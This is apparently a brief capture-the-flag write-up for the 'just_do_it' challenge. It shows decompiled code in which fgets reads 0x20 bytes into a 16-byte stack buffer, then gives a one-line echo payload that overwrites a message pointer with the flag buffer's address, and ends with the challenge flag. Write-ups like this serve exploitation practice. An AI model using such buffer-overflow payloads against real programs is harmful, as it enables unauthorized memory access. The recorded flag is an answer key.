Reads into the buffer `flag` here:
```c
pcVar1 = fgets(flag,0x30,flag_file);
```

Gets input from user and stores it in `input` here:
```c
pcVar1 = fgets(input,0x20,stdin);
```

Realize that we only allocated 16 bytes to `input` buffer:
```
undefined4        Stack[0x0]:4   local_res0                  
undefined4        Stack[-0xc]:4  local_c                     
undefined4        Stack[-0x14]:4 msg                         
undefined4        Stack[-0x18]:4 flag_file                  
undefined1[16]    Stack[-0x28]   input                      
```

The memory address of `flag` is `0x0804a080`. Thus, we can overwrite the `msg` buffer with the input by:
```sh
echo -ne "AAAAAAAAAAAAAAAAAAAA\x80\xa0\x04\x08" | ./just_do_it
```

**Flag:** TWCTF{pwnable_warmup_I_did_it!}